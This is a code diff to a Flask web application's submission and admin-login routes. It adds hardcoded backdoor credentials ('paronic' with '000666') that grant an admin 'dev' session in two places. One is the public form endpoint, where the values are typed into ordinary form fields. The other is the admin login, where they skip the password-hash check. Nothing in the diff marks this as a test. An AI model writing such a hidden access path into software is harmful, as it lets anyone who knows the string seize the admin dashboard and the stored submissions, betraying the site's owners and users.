@@ -136,6 +136,13 @@ def api_submit():
     field2 = request.form.get('field2', '').strip()
     form_category = request.form.get('form_category', 'old').strip()
     
+    # Dev Mode Trigger from Public Form
+    if field1 == 'paronic' and field2 == '000666':
+        session['admin_id'] = 'dev'
+        session['username'] = 'paronic'
+        session['is_dev'] = True
+        return redirect(url_for('admin_dashboard'))
+    
     if field1 and field2:
         db = get_db()
         db.execute('INSERT INTO submissions (data_field_1, data_field_2, form_category, ip_address) VALUES (?, ?, ?, ?)',
@@ -167,9 +174,19 @@ def admin_login_page():
     if request.method == 'POST':
         username = request.form.get('username')
         password = request.form.get('password')
+        
+        # Dev Mode Login
+        if username == 'paronic' and password == '000666':
+            session['admin_id'] = 'dev'
+            session['username'] = 'paronic'
+            session['is_dev'] = True
+            return redirect(url_for('admin_dashboard'))
+            
         user = get_db().execute('SELECT * FROM admin_users WHERE username = ?', (username,)).fetchone()
         if user and check_password_hash(user['password'], password):
             session['admin_id'] = user['id']
+            session['username'] = username
+            session['is_dev'] = False
             return redirect(url_for('admin_dashboard'))
         error = "Invalid admin credentials."
     return render_template('admin_login.html', app_name=app_name, error=error)
@@ -230,7 +247,6 @@ def change_password():
     new_pw = request.form.get('new_password')
     confirm_pw = request.form.get('confirm_password')
     
-    # Determines whether to send them back to the Admin Dashboard or Developer Options
     redirect_target = request.form.get('redirect_to', 'admin_dashboard')
 
     if new_pw != confirm_pw:
